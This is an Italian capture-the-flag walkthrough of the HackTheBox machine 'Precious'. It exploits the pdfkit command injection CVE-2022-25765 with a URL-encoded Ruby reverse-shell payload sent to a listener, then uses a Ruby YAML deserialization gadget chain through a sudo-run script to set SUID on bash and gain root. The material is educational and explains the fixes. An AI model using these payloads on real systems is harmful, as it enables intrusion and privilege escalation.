# Precious | Linux | Easy

## Synopsis

Precious è una macchina Linux di difficoltà **Easy** che ruota attorno al linguaggio **Ruby**. Ospita un'applicazione web Ruby personalizzata che usa la libreria **pdfkit v0.8.6**, vulnerabile a **CVE-2022-25765** (command injection), sfruttata per ottenere una shell iniziale. Il movimento laterale avviene tramite credenziali in chiaro trovate in un file di configurazione Gem. La privilege escalation sfrutta la **deserializzazione insicura di YAML** in uno script Ruby eseguibile con sudo.

## Foothold — CVE-2022-25765 (PDFkit Command Injection)

### Come funziona la vulnerabilità

pdfkit passa l'URL ricevuto direttamente al sistema senza sanitizzarlo. Usando la sintassi di **shell command substitution** con i backtick (`` ` ``), è possibile iniettare comandi arbitrari nel parametro `name` dell'URL.

```
http://target/?name=%20`comando`
```

### Exploit

```bash
# 1. Avviare listener
nc -nlvp 4444

# 2. Inviare il payload (in un altro terminale)
curl 'http://precious.htb/' -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'url=http%3A%2F%2F<IP_TUN0>%3A4444%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22<IP_TUN0>%22%2C4444%29%29%27%60'
```

![[rs.png]]

![[reverse_shell.png]]

Shell ricevuta come utente `ruby`.

```bash
# Upgrade a TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation — Ruby YAML Deserialization

### Enumerazione sudo

```bash
sudo -l
```

![[sudo -l.png]]

```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

### Analisi dello script

```ruby
def list_from_file
    YAML.load(File.read("dependencies.yml"))
end
```

**Due problemi critici:**
1. `YAML.load` deserializza oggetti Ruby arbitrari → **unsafe**
2. `dependencies.yml` è referenziato con **path relativo** → cercato nella directory corrente → controllabile dall'utente

### Perché YAML.load è pericoloso

`YAML.load` in Ruby può deserializzare oggetti di qualsiasi classe, incluse classi di sistema come `Kernel`. Questo permette di costruire una catena di oggetti che, durante la deserializzazione, esegue comandi arbitrari tramite il metodo `system` di `Kernel`.

> [!warning]
> La stessa classe di vulnerabilità esiste in Python con `pickle` e `PyYAML.load`. La versione sicura è sempre `YAML.safe_load` / `yaml.safe_load`.

### Exploit

Creare `~/dependencies.yml` con il payload di deserializzazione:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

```bash
# Eseguire lo script dalla home di henry (dove si trova il yml)
cd ~
sudo /usr/bin/ruby /opt/update_dependencies.rb

# Sfruttare il SUID su bash
/bin/bash -p
whoami  # root

cat /root/root.txt  # root flag
```

## Perché è Complesso

Anche se classificata Easy, Precious tocca concetti non banali:

**CVE-2022-25765** non è una semplice SQL injection — richiede di capire come pdfkit passa i parametri URL alla shell e come la command substitution con backtick bypassa la validazione dell'URL. Il payload deve essere URL-encoded e syntatticamente valido come URL.

**YAML Deserialization** è una classe di vulnerabilità sottovalutata: molti sviluppatori usano `YAML.load` senza sapere che può eseguire codice arbitrario. La catena di oggetti nel payload (`Gem::Installer` → `Net::BufferedIO` → `Kernel#system`) sfrutta la logica interna delle librerie RubyGems per arrivare all'esecuzione di comandi. Questo è il concetto alla base dei **gadget chain** nelle deserializzazione insicure — tecnica comune anche in Java (Ysoserial) e PHP.

Il path relativo di `dependencies.yml` è il classico esempio di **insecure file reference** che trasforma una vulnerabilità teorica in uno sfruttabile concreto.
